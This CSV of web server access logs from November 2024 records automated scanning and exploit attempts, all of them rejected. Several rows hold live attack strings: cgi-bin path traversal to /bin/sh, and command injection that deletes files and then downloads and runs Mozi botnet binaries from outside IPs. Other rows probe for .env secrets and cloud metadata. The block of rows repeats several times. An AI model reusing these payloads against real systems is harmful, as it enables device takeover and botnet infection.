ip,date,method,endpoint,status,size
73.160.102.101,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
149.24.54.238,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
161.81.236.153,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
46.209.203.100,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
191.80.32.165,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
117.155.199.90,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
157.153.156.2,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
167.111.241.86,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
88.52.233.33,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
214.86.196.52,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
35.151.55.25,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
163.191.241.65,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
81.23.114.10,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
82.55.249.53,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
173.206.15.233,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
29.50.143.193,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
199.151.45.48,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
180.44.241.162,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
141.69.154.14,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
132.5.246.106,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
223.171.236.76,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
10.73.171.9,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
62.126.77.98,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
253.165.161.178,15/Nov/2024:00:35:31 +0000,,-,408,
97.66.52.163,15/Nov/2024:00:36:08 +0000,,-,408,
29.86.123.14,15/Nov/2024:00:36:30 +0000,,-,408,
251.90.15.72,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
113.8.110.238,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
206.52.191.66,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
243.218.127.142,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
26.218.82.17,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
59.41.62.22,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
29.90.21.137,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
244.111.154.114,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
4.223.26.243,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
42.98.157.47,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
225.247.211.138,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
44.124.230.98,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
50.79.227.204,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
189.205.166.228,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
191.65.130.68,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
83.118.124.197,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
252.56.123.197,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
115.12.37.12,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
43.190.20.211,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
75.9.30.5,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
132.252.37.162,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
95.214.45.178,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
84.23.133.101,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
113.209.202.172,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
252.97.79.92,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
143.128.247.185,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
131.158.84.206,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
202.146.240.59,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
107.21.143.29,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
56.115.39.0,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
16.48.228.232,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
71.2.96.83,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
65.126.246.6,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
238.189.236.247,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
30.193.71.252,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
237.94.243.227,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
27.126.112.88,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
135.207.62.111,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
42.85.27.107,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
208.92.175.80,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
234.194.231.137,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
84.16.144.237,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
121.155.27.58,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
120.132.245.213,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
30.227.110.12,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
213.34.235.244,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
236.227.152.177,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
77.97.234.142,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
221.246.155.145,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
140.150.153.176,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
39.135.36.2,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
235.105.140.53,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
107.182.122.116,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
142.105.108.160,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
250.249.32.52,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
147.195.61.68,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
5.68.88.235,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
129.39.219.202,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
235.141.222.104,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
167.112.169.105,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
251.169.59.252,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
187.231.129.181,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
35.50.240.158,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
46.117.164.232,19/Nov/2024:20:16:26 +0000,,-,408,
24.186.219.114,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
56.226.233.222,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
51.148.181.93,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
178.205.217.80,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
204.66.97.81,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
28.238.131.199,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
155.232.168.109,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
52.114.232.65,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
19.112.191.67,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
42.29.176.94,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
198.53.89.15,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
56.19.137.107,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
126.216.105.104,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
174.63.7.26,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
81.155.44.174,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
30.193.150.84,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
9.95.45.205,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
42.217.6.14,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
169.5.64.117,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
86.116.241.215,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
71.71.29.17,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
73.40.218.7,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
74.136.29.148,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
209.241.189.86,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
80.37.89.96,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.178.75.211,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
183.76.10.228,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
123.217.74.207,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
104.198.49.81,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
3.145.37.44,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
1.88.55.162,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
136.108.56.111,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
21.203.210.114,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
24.106.49.208,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
222.229.253.206,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
159.205.9.192,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
80.222.205.49,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
154.26.53.49,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
83.88.66.52,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
59.67.5.193,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
153.223.21.214,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
39.134.6.195,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
210.107.177.248,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
202.132.19.115,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
87.18.236.114,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
212.63.0.71,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
219.106.1.11,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
52.19.104.54,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
49.188.178.112,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
32.31.186.110,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
217.25.153.251,15/Nov/2024:00:35:31 +0000,,-,408,
125.146.38.141,15/Nov/2024:00:36:08 +0000,,-,408,
37.224.20.228,15/Nov/2024:00:36:30 +0000,,-,408,
56.4.137.56,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
92.105.242.55,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
8.192.190.243,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
21.182.170.76,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
25.236.102.97,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
225.143.139.45,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
133.116.143.139,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
249.72.54.28,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
161.215.27.136,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
92.20.189.240,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
118.38.81.132,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
22.49.16.98,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
197.142.192.174,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
158.122.235.252,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
205.71.7.245,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
183.196.85.207,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
151.79.240.155,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
53.246.204.9,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
141.40.225.193,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
100.158.12.79,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
33.144.138.224,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
122.233.4.131,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
21.152.156.175,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
17.65.160.177,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
125.56.124.29,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
232.187.208.231,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
175.16.189.148,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
212.23.194.138,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
168.77.64.119,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
222.210.130.244,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
189.98.174.159,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
142.58.88.237,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
250.61.12.197,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
43.214.35.146,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
142.119.223.179,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
168.213.213.163,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
76.157.47.119,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
222.225.159.185,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
231.100.175.123,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
212.77.49.181,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
248.216.97.63,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
186.95.31.70,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
195.23.152.158,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
58.195.107.89,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
76.242.75.118,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
36.53.93.152,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
134.144.180.129,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
220.18.93.45,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
6.191.150.9,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
238.124.214.114,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
197.67.166.206,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
69.194.95.251,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
147.15.60.233,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
179.141.183.52,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
22.117.252.143,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
97.60.238.232,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
101.142.242.174,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
197.253.50.2,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
153.241.153.162,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
114.75.41.189,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
98.197.219.130,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
63.148.202.249,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
142.75.6.163,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
207.33.64.81,19/Nov/2024:20:16:26 +0000,,-,408,
176.39.111.88,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
172.195.192.162,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
6.234.172.217,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
106.176.135.68,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
98.197.81.43,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
203.196.205.138,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
253.25.172.58,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
106.164.209.79,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
208.109.106.170,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
171.63.193.50,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
254.185.67.205,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
6.193.252.232,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
244.126.175.185,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
113.163.144.33,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
242.182.214.229,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
18.223.111.9,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
66.214.91.228,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
176.109.21.138,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
181.126.59.65,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
209.133.227.109,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
138.182.140.115,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
190.182.147.40,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
33.76.179.201,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
161.251.49.122,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
254.177.159.22,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
49.165.196.108,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
20.63.185.181,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
180.107.156.228,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
140.24.250.246,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
137.47.133.207,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
62.102.41.30,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
132.8.246.124,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
57.214.168.7,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
49.180.180.253,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
65.178.160.113,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
238.3.214.16,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
16.193.249.3,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
14.165.97.127,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
42.5.123.63,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
99.169.1.14,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
182.47.158.232,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
8.16.108.151,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
247.73.247.28,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
159.11.90.91,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
239.2.171.164,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
179.7.161.85,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
176.39.178.32,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
63.51.142.28,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
80.154.127.80,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
135.16.122.204,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
245.63.58.16,15/Nov/2024:00:35:31 +0000,,-,408,
30.75.135.60,15/Nov/2024:00:36:08 +0000,,-,408,
45.114.240.143,15/Nov/2024:00:36:30 +0000,,-,408,
59.240.84.163,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
186.45.32.177,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
149.29.21.0,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
177.158.112.148,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
9.97.2.239,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
68.191.193.100,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
228.139.175.150,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
128.225.162.69,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
58.7.237.101,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
157.127.118.234,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
52.118.62.214,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
57.32.125.157,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
